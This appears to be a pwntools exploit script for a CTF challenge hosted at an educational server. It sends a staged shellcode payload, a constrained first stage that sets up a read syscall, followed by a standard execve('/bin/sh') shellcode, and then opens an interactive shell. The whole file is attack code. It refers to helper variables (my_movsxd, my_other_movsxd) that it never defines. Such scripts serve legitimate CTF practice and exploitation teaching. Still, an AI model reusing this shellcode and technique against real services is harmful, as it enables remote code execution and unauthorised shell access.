from pwn import *

context.arch = "amd64"

r = remote('edu-ctf.zoolab.org', 10002)


payload=b''
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")#push twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rdi")+asm("pop rdi")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push rbp")+asm("push rbp")#push twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("pop rsi")+asm("pop rsi")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x20")#push twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x20")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rdx")+asm("pop rdx")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")#pop twice to align
payload+=asm("or al,0x87")+my_movsxd+asm("push 0x00")
payload+=asm("or al,0x87")+my_movsxd+asm("pop rcx")+asm("pop rcx")#pop twice to align
payload+=asm("or al,0x87")+my_other_movsxd+asm("syscall")#use movsxd to reset eax
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#13
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#14
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#15
payload+=asm("or al,0x87")+my_movsxd+asm("call rbp")#16
output=r.recvuntil(b'talk is cheap, show me the code\n')#幫我撐10秒
print(output)
r.send(flat([payload]))
sleep(2)
second_shell_code="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
r.send(flat([second_shell_code]))
r.interactive()
